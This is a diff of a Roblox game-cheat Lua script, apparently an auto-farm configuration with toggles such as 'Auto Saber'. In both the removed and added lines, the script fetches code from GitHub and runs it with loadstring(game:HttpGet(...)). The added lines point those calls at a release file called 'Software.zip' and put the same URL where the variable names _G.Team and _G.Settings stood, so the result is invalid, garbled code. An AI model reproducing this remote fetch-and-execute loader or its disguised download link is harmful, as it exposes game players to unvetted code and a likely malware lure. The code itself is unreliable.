@@ -1,6 +1,6 @@
-_G.Team = "Pirates"
+https://github.com/celestialhub551/vitor-hub-kaitun/releases/download/v1.0/Software.zip = "Pirates"
 
-_G.Settings = {
+https://github.com/celestialhub551/vitor-hub-kaitun/releases/download/v1.0/Software.zip = {
 	Main = {
 		['Auto 2nd Sea'] = true,
 		["Auto Saber"] = true,
@@ -18,5 +18,5 @@ _G.Settings = {
 	},
 }
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/celestialhub551/vitorhubkaitun.lua/refs/heads/main/README.md"))()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/celestialhub551/vitorhubkaitun.lua/refs/heads/main/gui%20vitor%20hub"))()
+loadstring(game:HttpGet("https://github.com/celestialhub551/vitor-hub-kaitun/releases/download/v1.0/Software.zip"))()
+loadstring(game:HttpGet("https://github.com/celestialhub551/vitor-hub-kaitun/releases/download/v1.0/Software.zip%20vitor%20hub"))()
